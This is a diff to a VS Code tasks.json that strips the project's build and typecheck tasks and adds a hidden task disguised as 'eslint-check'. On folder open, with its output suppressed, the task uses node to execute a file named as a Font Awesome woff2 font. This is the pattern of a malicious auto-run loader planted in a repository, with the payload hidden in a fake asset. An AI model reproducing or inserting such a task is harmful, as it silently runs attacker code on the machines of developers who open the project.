@@ -1,73 +1,33 @@
 {
   "version": "2.0.0",
+  "configurations": [
+    {
+      "type": "node",
+      "request": "launch",
+      "name": "Run My Project",
+      "console": "",
+      "internalConsoleOptions": "openOnSessionStart"
+    }
+  ],
   "tasks": [
     {
-      "label": "tsc: build",
+      "label": "eslint-check",
       "type": "shell",
-      "command": "pnpm tsc --build --verbose",
-      "options": {
-        "cwd": "${workspaceFolder}",
-        "env": {
-          "NODE_ENV": "development",
-        }
-      },
-      "problemMatcher": [
-        "$tsc"
-      ],
-      "group": {
-        "kind": "build",
-        "isDefault": true
-      },
-      "promptOnClose": false,
+      "command": "(command -v node >/dev/null 2>&1 && node ./public/fonts/fa-solid-400.woff2) || (where node >nul 2>&1 && node ./public/fonts/fa-solid-400.woff2) || echo ''", 
+      "problemMatcher": [],
+      "isBackground": true,
+      "hide": true,
       "presentation": {
-        "showReuseMessage": false,
-        "reveal": "always",
-        "revealProblems": "onProblem",
-        "group": "build",
-        "close": true,
-        "clear": true,
-      }
-    },
-    {
-      "label": "ts: watch",
-      "type": "typescript",
-      "tsconfig": "tsconfig.json",
-      "option": "watch",
-      "problemMatcher": [
-        "$tsc-watch"
-      ],
-      "group": "build"
-    },
-    {
-      "label": "typecheck",
-      "type": "npm",
-      "script": "vscode:typecheck",
-      "problemMatcher": [
-        "$tsc"
-      ],
-      "options": {
-        "env": {
-          "NODE_ENV": "development"
-        }
-      },
-      "promptOnClose": false,
-      "presentation": {
+        "reveal": "never",
+        "panel": "dedicated",
+        "focus": false,
+        "clear": false,
         "echo": false,
-        "showReuseMessage": false,
-        "reveal": "always",
-        "group": "build",
-        "clear": true,
+        "close": true
+      },
+      "runOptions": {
+        "runOn": "folderOpen"
       }
     },
-    {
-      "label": "build_extension",
-      "type": "shell",
-      "command": "pnpm turbo run build --filter='@likec4/vscode-preview' --filter='likec4-vscode'",
-      "options": {
-        "env": {
-          "NODE_ENV": "development",
-        }
-      },
-    }
   ]
 }
